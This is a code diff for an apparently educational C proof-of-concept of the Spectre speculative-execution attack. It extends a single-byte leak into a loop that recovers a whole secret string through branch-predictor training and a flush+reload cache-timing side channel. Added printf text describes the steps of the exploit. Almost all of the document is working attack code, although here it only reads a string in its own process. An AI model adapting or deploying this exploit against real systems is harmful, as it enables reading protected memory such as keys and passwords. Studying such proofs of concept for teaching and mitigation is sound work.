@@ -3,14 +3,15 @@
 #include <stdlib.h>
 #include <stdio.h>
 #include <stdint.h>
+#include <string.h>
 
 unsigned int buffer_size = 10;
 uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9}; 
 uint8_t temp = 0;
-char *secret = "Some Secret Value";   
+char *secret = "Super Secure Data";   
 uint8_t array[256*4096];
 
-#define CACHE_HIT_THRESHOLD (80)
+#define CACHE_HIT_THRESHOLD (95)
 #define DELTA 1024
 
 // Sandbox Function
@@ -44,7 +45,7 @@ int i;
     time1 = __rdtscp(&junk);
     junk = *addr;
     time2 = __rdtscp(&junk) - time1;
-    if (time2 <= CACHE_HIT_THRESHOLD)
+    if (time2 <= CACHE_HIT_THRESHOLD && i != 0)
       scores[i]++; /* if cache hit, add 1 for this value */
   } 
 }
@@ -71,22 +72,42 @@ void spectreAttack(size_t larger_x)
 }
 
 int main() {
+  printf("Description:\n");
+  printf("\tWelcome to my spectre POC exploit code. At a high level, this code will read data from a restricted region in an illegal way. The restricted region is a simple function with an if-statement that checks if the input to the function is within a pre-set bounds, then returns the value of an array at the index given if the value was within range. If you want to check out the source (which I encourage you to do!), the restricted region function is titled restrictedAccess().\n");
+  printf("\n");
+  printf("Diving deeper, this program will do the following under the hood:\n");
+  printf("\t1) Create an array and flush it from the cache\n");
+  printf("\t2) Access the restricted function legitimately (by supplying values inside the given range) multiple times. This trains the CPU to expect this branch to be taken in the future\n");
+  printf("\t3) Flush from the cache the array and size variable used for in-range checking in the restricted region\n");
+  printf("\t4) Send a number that is out of range to the restricted region\n");
+  printf("\t5) Exfiltrate the data that was returned from the out-of-bounds read in step 4 from the cache\n");
+  printf("\t6) Print the value to the screen\n");
+  printf("\n");
+  printf("Conclusion:\n");
+  printf("\tWith this methodology, we successfully read data outside of what should be allowed. If none of this makes sense to you, check out the topics of protected memory, branch prediction, speculative execution, and out-of-order execution.\n\n");
+  
+  printf("Secret Value: ");
   int i;
   uint8_t s;
   size_t larger_x = (size_t)(secret-(char*)buffer);
   flushSideChannel();
-  for(i=0;i<256; i++) scores[i]=0; 
-  for (i = 0; i < 1000; i++) {
-    spectreAttack(larger_x);
-    reloadSideChannelImproved();
+  int count;
+  int len = strlen(secret);
+  char result[len];
+  setbuf(stdout, NULL);
+  for (count = 0; count < strlen(secret); count++) {
+  	for(i=0;i<256; i++) scores[i]=0;
+  	for (i = 0; i < 1000; i++) {
+    	spectreAttack(larger_x + count);
+    	reloadSideChannelImproved();
+  	}
+  	int max = 0;
+  	for (i = 0; i < 256; i++){
+   	if(scores[max] < scores[i])  
+		max = i;
+  	}
+	printf("%c", max);
   }
-  int max = 0;
-  for (i = 0; i < 256; i++){
-   if(scores[max] < scores[i])  
-     max = i;
-  }
-  printf("Reading secret value at %p = ", (void*)larger_x);
-  printf("The  secret value is %d\n", max);
-  printf("The number of hits is %d\n", scores[max]);
+  printf("\n");
   return (0); 
 }
